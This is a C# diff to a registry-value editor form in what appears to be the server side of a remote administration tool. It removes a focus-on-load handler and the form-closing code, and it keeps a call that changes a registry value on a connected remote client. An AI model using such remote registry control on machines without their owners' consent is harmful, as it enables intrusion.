@@ -32,12 +32,6 @@ namespace xServer.Forms
             this.valueDataTxtBox.Text = value.Data.ToString();
         }
 
-        private void FrmRegValueEditString_Load(object sender, EventArgs e)
-        {
-            this.valueDataTxtBox.Select();
-            this.valueDataTxtBox.Focus();
-        }
-
         private void okButton_Click(object sender, EventArgs e)
         {
             if (valueDataTxtBox.Text != _value.Data.ToString())
@@ -45,12 +39,6 @@ namespace xServer.Forms
                 object valueData = valueDataTxtBox.Text;
                 new xServer.Core.Packets.ServerPackets.DoChangeRegistryValue(_keyPath, new RegValueData(_value.Name, _value.Kind, valueData)).Execute(_connectClient);
             }
-            this.Close();
-        }
-
-        private void cancelButton_Click(object sender, EventArgs e)
-        {
-            this.Close();
         }
     }
 }
